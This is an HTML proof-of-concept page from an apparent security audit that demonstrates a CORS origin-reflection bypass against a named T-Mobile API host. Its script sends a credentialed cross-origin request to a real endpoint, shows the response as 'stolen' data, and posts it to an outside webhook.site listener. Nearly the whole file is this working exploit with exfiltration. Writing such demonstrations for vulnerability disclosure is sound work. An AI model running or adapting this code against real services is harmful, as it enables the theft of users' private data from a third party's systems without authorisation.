<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Impact Demonstration | Security Audit</title>
    <style>
        :root { --tmo-magenta: #e20074; --bg: #0b0e11; --card: #1c2128; --text: #e1e1e1; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: var(--bg); color: var(--text); display: flex; justify-content: center; padding-top: 50px; }
        .container { width: 100%; max-width: 800px; background: var(--card); border-radius: 12px; border-top: 6px solid var(--tmo-magenta); box-shadow: 0 10px 30px rgba(0,0,0,0.5); padding: 30px; }
        h1 { color: var(--tmo-magenta); margin-top: 0; font-size: 1.8rem; text-align: center; }
        .info { background: #2d333b; padding: 15px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid #58a6ff; font-size: 0.9rem; }
        .input-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; color: #8b949e; }
        input { width: 100%; padding: 12px; background: #0d1117; border: 1px solid #444c56; color: white; border-radius: 6px; box-sizing: border-box; font-family: monospace; }
        .btn-exploit { background-color: var(--tmo-magenta); color: white; border: none; padding: 15px; border-radius: 6px; width: 100%; font-size: 1rem; font-weight: bold; cursor: pointer; transition: 0.2s; text-transform: uppercase; letter-spacing: 1px; }
        .btn-exploit:hover { background-color: #ff0084; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(226, 0, 116, 0.4); }
        .result-area { margin-top: 25px; border: 2px solid #30363d; border-radius: 8px; overflow: hidden; }
        .result-header { background: #30363d; padding: 10px 15px; font-weight: bold; display: flex; justify-content: space-between; font-size: 0.85rem; }
        #stolen-data { background: #0d1117; color: #ff7b72; padding: 20px; min-height: 150px; white-space: pre-wrap; word-break: break-all; font-family: 'Consolas', 'Monaco', monospace; font-size: 13px; }
        .status-tag { padding: 2px 8px; border-radius: 4px; font-size: 0.75rem; }
        .vuln { background: #f85149; color: white; }
        .secure { background: #39d353; color: black; }
    </style>
</head>
<body>

<div class="container">
    <h1>CORS Data Exfiltration PoC</h1>
    
    <div class="info">
        <strong>Attacker Origin:</strong> <code id="my-origin"></code><br>
        <strong>Vulnerability:</strong> Regex Bypass on <code>adn.t-mobile.com</code>
    </div>

    <div class="input-group">
        <label>Target API Endpoint (Must return sensitive data):</label>
        <input type="text" id="target-url" value="https://adn.t-mobile.com/prmtns-meg-promo-api/prd01/promo-api/v1/promo-admin/client/1044/asset/MaintenanceText">
    </div>

    <button class="btn-exploit" onclick="runExploit()">Execute Exploit & Exfiltrate</button>

    <div class="result-area">
        <div class="result-header">
            <span>Stolen JSON Response Body</span>
            <span id="vuln-indicator" class="status-tag" style="display:none;">VULNERABILITY CONFIRMED</span>
        </div>
        <div id="stolen-data">Waiting for execution...</div>
    </div>
</div>

<script>
    // Configuration
    document.getElementById('my-origin').innerText = window.location.origin;
    const webhookURL = "https://webhook.site/7dedcf0e-fa4f-4dba-a805-04d37de87b08";

    async function runExploit() {
        const url = document.getElementById('target-url').value;
        const display = document.getElementById('stolen-data');
        const indicator = document.getElementById('vuln-indicator');
        
        display.innerText = "Bypassing Same-Origin Policy...";
        display.style.color = "#8b949e";

        try {
            // THE CORE EXPLOIT: Making a credentialed cross-origin request
            const response = await fetch(url, {
                method: 'GET',
                credentials: 'include', // Key to stealing private user data
                mode: 'cors',
                headers: {
                    'Accept': 'application/json, text/plain, */*'
                }
            });

            const acaoHeader = response.headers.get('Access-Control-Allow-Origin');
            const data = await response.text();

            // Check if our specific domain was reflected
            if (acaoHeader === window.location.origin) {
                indicator.style.display = "inline";
                indicator.className = "status-tag vuln";
                display.style.color = "#39d353"; // Green if we successfully read it
            }

            // Update UI with stolen data
            display.innerText = data ? data : "[Request Successful - No Body Content]";

            // EXFILTRATION: Sending the stolen data to our listener
            fetch(webhookURL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    origin: window.location.origin,
                    endpoint: url,
                    stolen_content: data,
                    acao_reflected: acaoHeader
                })
            });

        } catch (err) {
            display.style.color = "#f85149";
            display.innerText = "Exploit Blocked: Browser enforced SOP. \nThis means the server did not reflect our origin for this request.";
            console.error(err);
        }
    }
</script>

</body>
</html>
